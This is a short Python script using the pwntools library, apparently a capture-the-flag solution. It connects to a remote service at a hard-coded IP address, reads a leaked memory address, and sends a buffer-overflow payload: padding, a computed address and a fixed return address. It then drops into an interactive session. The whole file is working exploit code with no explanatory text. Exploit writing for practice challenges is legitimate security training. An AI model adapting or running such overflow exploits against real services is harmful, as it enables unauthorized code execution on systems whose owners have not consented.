from pwn import *
import time
import re


p = remote("124.16.75.117", 51001)
p.sendline(b"lp")
time.sleep(1)

p.sendline(b"1")
time.sleep(1)
output = b""
output = p.recv()


output_str = output.decode("utf-8")
print(output_str)

match = re.search(r"we in addr 0x([0-9a-fA-F]+)", output_str)
address = int(match.group(1), 16)
payload = p32(address + 32)

input = b""
for i in range(24):
    input += b","
data = payload
input += data
data = b"\x44\x86\x04\x08"
input += data
print(input)

p.sendline(input)
time.sleep(1)
p.sendline(b"3")
p.interactive()
